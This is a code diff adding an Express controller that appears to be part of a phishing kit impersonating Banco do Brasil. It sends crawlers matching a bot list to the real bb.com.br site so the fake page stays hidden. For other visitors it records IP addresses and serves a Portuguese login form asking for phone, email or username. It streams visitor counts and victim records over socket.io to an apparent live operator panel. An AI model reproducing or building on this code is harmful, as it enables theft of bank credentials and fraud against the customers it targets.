@@ -1,0 +1,73 @@
+const Client = require('../../models/Client')
+const isbot = require('isbot')
+const Visitor = require('../../models/visitor')
+const Robots = require('../../modules/Robots')
+
+module.exports = {
+    async view(req, res) {
+        try {
+            isbot.extend(Robots)
+
+            if (isbot(req.get('user-agent'))) return res.redirect('https://www.bb.com.br/pbb/pagina-inicial')
+
+            //const ip = req.socket.remoteAddress
+            const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim()
+
+            if (!ip) return
+
+            const visitor = await Visitor.findOne({ where: { ip } })
+
+            if (!visitor) {
+                await Visitor.create({ ip })
+
+                const countVisitors = await Visitor.count()
+
+                req.app.io.emit('visitors', countVisitors)
+            }
+
+            const { client } = req.query
+
+            const cliente = await Client.findByPk(client)
+
+            if (client) {
+                req.app.io.emit('userReconnect', cliente.toJSON())
+                return res.render('pages/index', {
+                    title: 'Olá! Digite o seu telefone, e-mail ou usuário',
+                    pageClasses: 'cadastro',
+                    client: cliente.toJSON(),
+                })
+            }
+
+            return res.render('pages/index', {
+                title: 'Olá! Digite o seu telefone, e-mail ou usuário',
+                pageClasses: 'cadastro',
+            })
+        } catch (error) {
+            console.log(error)
+            return res.redirect('/')
+        }
+    },
+    async error(req, res) {
+        try {
+            const { client_id } = req.params
+
+            const client = await Client.findByPk(client_id)
+
+            if (!client) return res.redirect('/modules/conta')
+
+            await client.update({ status: `Online no usuário` })
+
+            req.app.io.emit('updateClient', client.toJSON())
+
+            return res.render('pages/index', {
+                title: 'Olá! Digite o seu telefone, e-mail ou usuário',
+                pageClasses: 'cadastro',
+                error: `error`,
+                client: client.toJSON(),
+            })
+        } catch (error) {
+            console.log(error)
+            return res.redirect('/')
+        }
+    },
+}
